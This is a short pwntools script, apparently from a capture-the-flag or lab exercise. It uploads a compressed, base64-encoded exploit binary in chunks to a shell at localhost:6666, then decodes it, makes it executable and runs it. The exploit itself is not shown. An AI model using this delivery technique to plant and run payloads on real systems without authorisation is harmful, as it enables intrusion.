from base64 import b64encode
from gzip import compress

from pwn import *

r = remote("localhost", 6666)
r.recvuntil(b"~ $")

f = b64encode(compress(open("exploit", "rb").read()))

print(len(f))

from itertools import zip_longest


def grouper(n, iterable, padvalue=None):
    "grouper(3, 'abcdefg', 'x') --> ('a','b','c'), ('d','e','f'), ('g','x','x')"
    return zip_longest(*[iter(iterable)] * n, fillvalue=padvalue)


it = 0
for i in grouper(800, f, 0):
    s = bytes(i)
    r.sendline(f"echo -n '{s.decode()}' >> payload.gz.b64".encode())
    r.recvuntil(b"~ $")
    print(it)
    it += 1

r.sendline(
    b"base64 -d payload.gz.b64 > payload.gz && gunzip payload.gz && chmod +x payload"
)
r.recvuntil(b"~ $")
r.sendline(b"./payload")
print(r.recvuntil(b"~ $").decode())
